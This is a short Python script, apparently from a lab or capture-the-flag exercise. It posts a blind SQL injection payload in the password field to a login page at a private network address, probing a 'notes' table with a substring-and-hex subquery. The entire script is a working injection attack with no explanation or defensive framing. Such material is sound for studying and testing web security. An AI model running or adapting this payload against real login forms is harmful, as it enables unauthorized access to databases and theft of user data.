import requests

INJECTION =  "(SELECT hex(substr('A',1,1)) from notes)>0 -- f"
r = requests.post("http://192.168.178.75/login", data={"username": "JohnDoe", "password": "john1232' or " + INJECTION, "checksum": "3a9d0a"})
print(r.content)